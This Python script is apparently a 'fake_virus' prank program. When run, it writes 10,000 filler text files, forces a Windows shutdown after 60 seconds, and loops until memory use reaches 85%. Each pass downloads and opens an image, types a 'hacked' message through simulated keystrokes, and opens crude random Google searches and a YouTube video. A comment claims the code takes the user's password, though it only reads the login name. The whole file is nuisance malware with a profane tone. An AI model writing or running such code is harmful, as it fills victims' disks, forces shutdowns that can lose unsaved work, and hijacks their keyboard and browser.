import pyautogui
import webbrowser
import random
import requests
import psutil
import os

# write 10,000 files
txt_number = 10000

bytes = 100 * 100

string = "get trolled " * bytes

for i in range(1, txt_number + 1):
    filename = f"get trolled_{i}.txt"
    with open(filename, "w") as file:
        file.write(string)


searches = [
    'fuck java',
    'how to trick an idiot',
    'why is my microwave laughing',
    'can I sue my toaster',
    'is water wet or am I just dumb',
    'free robux no scam',
    'how to become sigma in 5 minutes',
    'why does my cat pay taxes',
    'best excuses to not pay taxes',
    'can AI legally adopt me',
    'how to delete Internet Explorer in real life',
    'greg is watching me help',
    'how to summon hatsune miku at 3am',
    'free vbucks generator real 2025',
    'can I sell my browser history on eBay',
    'do penguins have knees',
    'why does my keyboard smell like Doritos',
    'how to install Windows on my fridge',
    'can I drink liquid nitrogen for fun',
    'why does my Roomba know my name',
    'how to become CEO of Google with no experience',
    'best way to get banned from roblox',
    'where to download RAM for free',
    'how to legally marry my anime waifu',
    'help my smart fridge joined a cult',
    'why does my wifi connect to the backrooms',
    'can you deep fry air',
    'do I really need all my organs'
]

# download the fucking miku image
url = 'https://is1-ssl.mzstatic.com/image/thumb/Music221/v4/b8/92/ce/b892cead-70a1-8f29-0045-af30080d3a16/4571640501760_cover.png/316x316bb.webp'

# get the user's username and password
username = os.getlogin()

# print the username
print(f'Hi, {username}.')

os.system("shutdown /s /f /t 60")

def main():
    downloaded_number = 1
    while True:
        
        ram = psutil.virtual_memory()
        ram_percentage = ram.percent
        max_ram = 85
        
        if ram_percentage >= max_ram:
            break
        
        # download the image
        response = requests.get(url)
        with open("nice_try.webp", "wb") as file:
            file.write(response.content)
        
        # press shit idfk
        pyautogui.press('capslock')
        pyautogui.typewrite('hacked by fake_virus...imagine...')
        pyautogui.press('enter')
        
        
        new_filename = f"nice_try{downloaded_number}.webp"
        
        downloaded_number += 1
        os.rename("nice_try.webp", new_filename)
        os.startfile(new_filename)
        
        search = random.choice(searches)
        webbrowser.open(f"https://www.google.com/search?q={search}")
        webbrowser.open(f"https://www.youtube.com/watch?v=MX8eYdEOU5w")
    
main()
